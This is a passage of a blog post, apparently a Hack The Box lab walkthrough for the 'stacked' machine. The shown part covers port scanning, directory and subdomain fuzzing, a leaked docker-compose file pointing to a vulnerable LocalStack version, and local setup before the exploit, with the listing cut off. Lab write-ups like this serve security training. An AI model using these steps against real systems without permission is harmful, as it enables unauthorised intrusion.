<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	 InsanePoints:	50Release:	18 Sep 2021IP:	10.10.11.112">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[stacked]">
<meta property="og:url" content="https://fdlucifer.github.io/2022/02/14/stacked/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	 InsanePoints:	50Release:	18 Sep 2021IP:	10.10.11.112">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2146.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2147.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2148.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2149.jpg">
<meta property="article:published_time" content="2022-02-14T06:11:25.000Z">
<meta property="article:modified_time" content="2022-03-20T01:02:15.763Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="HackTheBoxÈù∂Êú∫ÁªÉ‰π†">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2146.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2022/02/14/stacked/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/02/14/stacked/","path":"2022/02/14/stacked/","title":"Hack-The-Box-walkthrough[stacked]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[stacked] | lUc1f3r11's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="lUc1f3r11's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">lUc1f3r11's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-TCP-80"><span class="nav-number">2.2.</span> <span class="nav-text">HTTP TCP 80</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Getting-reverse-shell"><span class="nav-number">3.</span> <span class="nav-text">Getting reverse shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#root"><span class="nav-number">4.</span> <span class="nav-text">root</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">203</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub ‚Üí https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail ‚Üí mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter ‚Üí https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page ‚Üí https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube ‚Üí https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram ‚Üí https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange ‚Üí https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">ËÆ∞ÂøÜÈáåÁöÑÁ∫ØÁúü</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">Â∞èÁ¶ª</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/02/14/stacked/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="lUc1f3r11">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[stacked] | lUc1f3r11's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[stacked]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-14 14:11:25" itemprop="dateCreated datePublished" datetime="2022-02-14T14:11:25+08:00">2022-02-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-03-20 09:02:15" itemprop="dateModified" datetime="2022-03-20T09:02:15+08:00">2022-03-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>5.5k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>20 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	 Insane<br>Points:	50<br>Release:	18 Sep 2021<br>IP:	10.10.11.112</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2146.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.112</span></span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.41</span><br><span class="line">2376/tcp open  ssl/docker?</span><br></pre></td></tr></table></figure>

<p>Based on OpenSSH version, the host is likely running Ubuntu Focal 20.04.</p>
<h2 id="HTTP-TCP-80"><a href="#HTTP-TCP-80" class="headerlink" title="HTTP TCP 80"></a>HTTP TCP 80</h2><p>Looking at the page using curl, I see it redirected to <span class="exturl" data-url="aHR0cDovL3N0YWNrZWQuaHRiLw==">http://stacked.htb/<i class="fa fa-external-link-alt"></i></span> so let‚Äôs add it to &#x2F;etc&#x2F;hosts.</p>
<p>Visiting the page on browser.</p>
<p>I run gobuster against the site with html extensions.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># gobuster dir -u http://stacked.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://stacked.htb</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/02/13 20:42:12 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 311] [--&gt; http://stacked.htb/images/]</span><br><span class="line">/index.html           (Status: 200) [Size: 5055]                                </span><br><span class="line">/css                  (Status: 301) [Size: 308] [--&gt; http://stacked.htb/css/]   </span><br><span class="line">/js                   (Status: 301) [Size: 307] [--&gt; http://stacked.htb/js/]    </span><br><span class="line">/fonts                (Status: 301) [Size: 310] [--&gt; http://stacked.htb/fonts/]</span><br></pre></td></tr></table></figure>

<p>Nothing useful here.<br>Then I run ffuf to find is there another subdomain of stacked.htb.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># /root/ffuf/ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://stacked.htb -H &quot;host: FUZZ.stacked.htb&quot; -fw 18 </span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.1.0-git</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://stacked.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.stacked.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 18</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">portfolio               [Status: 200, Size: 30268, Words: 11467, Lines: 445]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">portfolio.stacked.htb</span></span><br></pre></td></tr></table></figure>

<p>Found portfolio subdomain, I add it to &#x2F;etc&#x2F;hosts.</p>
<p>The download button links to portfolio.stacked.htb&#x2F;files&#x2F;docker-compose.yml, and will download the file.</p>
<p>Looking at the docker-compose.yml, The machine is likely has localstack version 0.12.6 running on the localhost. localstack is basically aws but host in local machine</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvY2Fsc3RhY2svbG9jYWxzdGFjaw==">localstack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># cat docker-compose.yml </span></span><br><span class="line">version: <span class="string">&quot;3.3&quot;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  localstack:</span><br><span class="line">    container_name: <span class="string">&quot;<span class="variable">$&#123;LOCALSTACK_DOCKER_NAME-localstack_main&#125;</span>&quot;</span></span><br><span class="line">    image: localstack/localstack-full:0.12.6</span><br><span class="line">    network_mode: bridge</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;127.0.0.1:443:443&quot;</span></span><br><span class="line">      - <span class="string">&quot;127.0.0.1:4566:4566&quot;</span></span><br><span class="line">      - <span class="string">&quot;127.0.0.1:4571:4571&quot;</span></span><br><span class="line">      - <span class="string">&quot;127.0.0.1:<span class="variable">$&#123;PORT_WEB_UI-8080&#125;</span>:<span class="variable">$&#123;PORT_WEB_UI-8080&#125;</span>&quot;</span></span><br><span class="line">    environment:</span><br><span class="line">      - SERVICES=serverless</span><br><span class="line">      - DEBUG=1</span><br><span class="line">      - DATA_DIR=/var/localstack/data</span><br><span class="line">      - PORT_WEB_UI=<span class="variable">$&#123;PORT_WEB_UI- &#125;</span></span><br><span class="line">      - LAMBDA_EXECUTOR=<span class="variable">$&#123;LAMBDA_EXECUTOR- &#125;</span></span><br><span class="line">      - LOCALSTACK_API_KEY=<span class="variable">$&#123;LOCALSTACK_API_KEY- &#125;</span></span><br><span class="line">      - KINESIS_ERROR_PROBABILITY=<span class="variable">$&#123;KINESIS_ERROR_PROBABILITY- &#125;</span></span><br><span class="line">      - DOCKER_HOST=unix:///var/run/docker.sock</span><br><span class="line">      - HOST_TMP_FOLDER=<span class="string">&quot;/tmp/localstack&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;/tmp/localstack:/tmp/localstack&quot;</span></span><br><span class="line">      - <span class="string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span></span><br></pre></td></tr></table></figure>

<p>Looking at localstack github repository, LocalStack version 0.12.6 is not the latest, chances are that version has vulnerability.</p>
<p>After some googling for vulnerability for that version, I found this blog greatly explain about the vulnerability.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNvbmFyc291cmNlLmNvbS9oYWNrLXRoZS1zdGFjay13aXRoLWxvY2Fsc3RhY2s=">Hack the Stack with LocalStack: Code Vulnerabilities Explained<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>I see several possible vulnerability. The OS Command Injection is the one we looking for.</p>
<p>Let‚Äôs start the image on our local machine first. make sure the docker-compose.yml exist<br>in the same directory and run docker-compose up.<br>It will download the localstack v0.12.6 image and running it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br><span class="line"></span><br><span class="line">docker container <span class="built_in">ls</span> -a</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -ti 587e29281490 /bin/bash</span><br></pre></td></tr></table></figure>

<p>We can see api.py code in &#x2F;opt&#x2F;code&#x2F;localstack&#x2F;localstack&#x2F;dashboard&#x2F;api.py has the route in line 85.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 